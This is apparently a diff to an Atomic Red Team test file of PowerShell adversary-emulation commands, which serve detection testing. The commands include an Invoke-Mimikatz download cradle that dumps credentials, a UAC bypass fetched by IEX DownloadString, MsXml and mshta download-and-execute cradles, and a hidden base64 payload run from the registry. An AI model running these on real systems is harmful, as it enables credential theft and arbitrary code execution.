@@ -14,7 +14,7 @@ atomic_tests:
     mimurl:
       description: Mimikatz url
       type: url
-      default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+      default: https://raw.githubusercontent.com/EmpireProject/Empire/3.0-Beta/data/module_source/credentials/Invoke-Mimikatz.ps1
 
   executor:
     name: command_prompt
@@ -64,7 +64,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      $url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
+      $url='https://raw.githubusercontent.com/EmpireProject/Empire/3.0-Beta/data/module_source/credentials/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
 
 - name: Invoke-AppPathBypass
   description: |
@@ -78,8 +78,7 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass"
-      C:\Windows\System32\cmd.exe
+      Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass C:\Windows\System32\cmd.exe"
 
 - name: PowerShell Add User
   description: |
@@ -108,7 +107,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} -Description '#{description}'
+      New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password $(Convert-to-SecureString '#{password}' -AsPlainText -Force) -Description '#{description}'
 
 - name: Powershell MsXml COM object - no prompt
   description: |
@@ -128,7 +127,7 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      powershell.exe IEX -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
+      powershell.exe -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
 
 - name: Powershell MsXml COM object - with prompt
   description: |
@@ -186,7 +185,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      "C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
+      &"C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
 
 - name: Powershell Invoke-DownloadCradle
   description: |
@@ -212,5 +211,5 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggJyVTeXN0ZW1Sb290JS9UZW1wL2FydC1tYXJrZXIudHh0JyAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
+      reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggJGVudjpTeXN0ZW1Sb290L1RlbXAvYXJ0LW1hcmtlci50eHQgLXZhbHVlICJIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0i"
       powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
